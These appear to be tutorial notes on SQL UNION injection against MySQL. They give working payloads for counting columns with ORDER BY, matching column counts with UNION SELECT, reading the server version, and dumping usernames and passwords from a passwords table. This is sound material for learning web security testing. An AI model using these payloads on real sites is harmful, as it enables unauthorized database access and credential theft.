## Union Cause
The [Union](https://dev.mysql.com/doc/refman/8.0/en/union.html) clause is used to combine results from multiple `SELECT` statements. This means that through a `UNION` injection, we will be able to `SELECT` and dump data from all across the DBMS, from multiple tables and databases. 

```shell-session
mysql> SELECT * FROM ports UNION SELECT * FROM ships;
```

```sql
SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
```
## Un-even Columns
Tip: For advanced SQL injection, we may want to simply use 'NULL' to fill other columns, as 'NULL' fits all data types.
```sql
SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords
```
```sql
UNION SELECT username, 2, 3, 4 from passwords-- '
```
```shell-session
mysql> SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- '
```

# UNION injection
#### Using ORDER BY
```sql
' order by 1-- -
```
Reminder: We are adding an extra dash (-) at the end, to show you that there is a space after (--).
```sql
' order by 2-- -
```
#### Using UNION
```sql
cn' UNION select 1,2,3-- -
```
```sql
cn' UNION select 1,2,3,4-- -
```

## Location of Injection
```sql
cn' UNION select 1,@@version,3,4-- -
```
